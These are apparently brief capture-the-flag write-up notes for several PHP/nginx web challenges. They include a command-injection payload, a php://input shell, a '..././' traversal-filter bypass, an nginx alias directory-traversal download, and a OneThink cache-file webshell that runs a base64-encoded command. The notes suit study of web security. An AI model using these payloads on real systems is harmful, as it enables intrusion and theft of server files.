##misc web 1
key: $GLOBALS可以查看当前页面所有变量
flag在变量里，$$a, $a='GLOBALS'


##misc web 2
key: 命令注入
eval('var_dump($a);');
$a = 'xxx; echo `cat flag.php`'


##misc web 3
随便跟着做做。


##include
key: allow_url_include is on.
php://input直接getshell


##Zone
key: nginx autoindex on 且alias配置不当目录遍历下载
 主页面有个登录。把cookie: login = 1 进入
然后admin.php?modules=flag.php&name=
存在文件包含
试了一下发现不能访问父目录。
../不行但是./可以。说明没过滤 “.”和 "/"
试了一下发现是直接删除了../, 所以直接双写
..././则可以访问父目录从而读文件。
..././..././..././etc/nginx/sites-enabled/default
中 
location /online-movies{
alias /movies/
autoindex on 
}
那么直接访问 /online-movies../就可以遍历根目录(原理。/online-movies../被解析成/movies/../)
/online-movies../var/www/html/flag.php
直接下载flag.php


##OneThink
Key: 缓存文件包含无限制用户名，通过构造用户名getshell
详见onethink getshell by 缓存文件 /Runtime/Temp/
用户名存在长度限制。所以通过三次注册构造。然后绕waf 
$a=$_GET[a];
$b=$_GET[b];
$a($b);
a=system&b=`echo "Y2F0IC4uLy4uL2ZsYWcucGhw" | base64 -d`
